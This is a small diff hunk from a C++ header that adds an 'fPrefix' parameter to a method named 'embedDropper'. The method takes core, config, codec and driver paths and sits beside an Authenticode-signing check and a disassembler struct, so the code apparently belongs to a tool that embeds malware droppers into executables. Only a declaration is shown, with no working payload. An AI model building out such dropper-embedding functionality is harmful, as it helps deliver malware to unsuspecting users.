@@ -206,7 +206,7 @@ public:
 	
 	bool isAuthenticodeSigned();
 	
-	bool embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest);
+	bool embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest, std::string fPrefix);
 	
 	typedef struct {
 		DISASM d;
